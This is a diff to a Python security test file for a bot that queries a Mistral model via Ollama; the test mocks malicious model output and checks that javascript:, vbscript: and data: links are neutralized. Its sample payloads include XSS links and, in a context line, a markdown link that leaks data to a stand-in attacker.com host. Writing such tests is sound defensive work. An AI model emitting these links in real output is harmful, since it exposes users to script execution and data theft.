@@ -52,20 +52,23 @@ class TestSecurity(unittest.TestCase):
         self.assertIn("[exfil](http://attacker.com/leak?data=sensitive)", answer)
 
     @patch('bot.http_session.post')
-    def test_javascript_link_neutralization(self, mock_post):
+    def test_protocol_neutralization(self, mock_post):
         mock_post.return_value.status_code = 200
-        # Simulated malicious LLM output trying to use javascript: for XSS
+        # Simulated malicious LLM output trying to use various protocols for XSS
         mock_post.return_value.json.return_value = {
-            'response': 'Click [here](javascript:alert("XSS")) or [HERE](JAVASCRIPT:alert("XSS"))'
+            'response': 'Links: [js](javascript:a), [JS-WS](javascript :a), [vb](vbscript:a), [data](data:a)'
         }
 
         answer = ask_mistral_ollama("safe query", "safe context")
 
-        # Verify that 'javascript:' is neutralized case-insensitively
-        # We check for the string 'javascript:' (lowercase) being absent.
-        # Since we use re.IGNORECASE, all variations should be replaced.
-        self.assertNotIn("javascript:", answer.lower())
-        self.assertIn("blocked-js:alert(\"XSS\")", answer)
+        import re
+        # Check that the protocols are neutralized (prefixed with blocked-)
+        self.assertIn("blocked-javascript:a", answer)
+        self.assertIn("blocked-vbscript:a", answer)
+        self.assertIn("blocked-data:a", answer)
+
+        # Verify no un-blocked instances remain
+        self.assertFalse(re.search(r'(?<!blocked-)(javascript|vbscript|data)\s*:', answer, re.IGNORECASE))
 
 if __name__ == '__main__':
     unittest.main()
